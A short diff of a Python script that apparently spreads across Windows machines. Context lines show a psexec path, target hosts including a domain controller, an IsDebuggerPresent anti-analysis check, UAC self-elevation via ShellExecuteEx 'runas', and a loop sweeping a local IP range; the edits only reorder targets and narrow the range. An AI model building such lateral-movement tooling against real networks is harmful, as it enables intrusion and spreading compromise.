@@ -35,7 +35,7 @@ NUM_CORES = 4
 ASADMIN = 'asadmin'
 pexecPath = 'C:\\temp\\psexec.exe'
 cmdshell = "cmd.exe"
-computers = ["dc","NOTAVICTIM7","jumpbox-PC"]
+computers = ["dc","jumpbox-PC","NOTAVICTIM7"]
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
 IsDebuggerPresent = kernel32.IsDebuggerPresent
 remoteNet = "192.168.251."
@@ -151,7 +151,7 @@ def computer_Scheduler():
 
 if __name__ == '__main__':
     run = 0
-    
+
     try:
         print('''
 
@@ -178,7 +178,7 @@ if __name__ == '__main__':
             params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
             shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
 
-        for ip in range(1,20):
+        for ip in range(1,2):
             netRange = '192.168.31.'
             host = netRange + str(ip)
             hosts.append(host)
